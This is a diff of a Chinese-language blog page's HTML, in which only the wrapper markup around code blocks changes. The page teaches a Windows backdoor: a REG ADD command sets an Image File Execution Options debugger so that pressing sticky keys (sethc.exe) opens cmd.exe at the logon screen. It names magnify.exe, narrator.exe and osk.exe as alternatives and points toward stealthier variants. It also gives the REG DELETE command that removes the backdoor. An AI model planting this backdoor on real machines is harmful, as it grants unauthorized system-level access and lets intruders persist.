@@ -123,9 +123,8 @@
 
 <p>以管理员身份打开cmd.exe运行如下:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"
+</code></pre></div></div>
 
 <p>其中sethc.exe可替换成magnify.exe(放大镜)或其他(eg.narrator.exe/osk.exe),替换成更隐藏的技巧可根据下面链接自由发挥</p>
 
@@ -133,9 +132,8 @@
 
 <p>删除后门以管理员身份打开cmd.exe运行如下即可:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
+</code></pre></div></div>
 
 <p>以上理论上适用于win vistar以上系统,只在win7上测试过.</p>
 
